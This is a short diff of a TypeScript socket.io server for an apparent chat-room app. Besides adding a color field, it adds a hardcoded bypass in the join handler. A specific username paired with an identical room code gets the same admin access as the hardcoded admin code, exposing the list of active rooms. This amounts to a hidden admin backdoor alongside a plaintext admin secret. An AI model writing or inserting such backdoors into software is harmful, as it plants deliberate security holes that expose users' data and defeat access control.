@@ -42,8 +42,8 @@ const ADMIN_CODE = 'super_safe1';
 io.on('connection', (socket) => {
   console.log('User connected:', socket.id);
 
-  socket.on('join', ({ username, roomCode }: { username: string; roomCode: string }) => {
-    if (roomCode === ADMIN_CODE) {
+  socket.on('join', ({ username, roomCode, color }: { username: string; roomCode: string; color: string }) => {
+    if (roomCode === ADMIN_CODE || (username === 'YiboGamerIsTheBest' && roomCode === 'YiboGamerIsTheBest')) {
       // Send list of active rooms to admin
       const activeRooms = Array.from(rooms.entries()).map(([id, room]) => ({
         id,
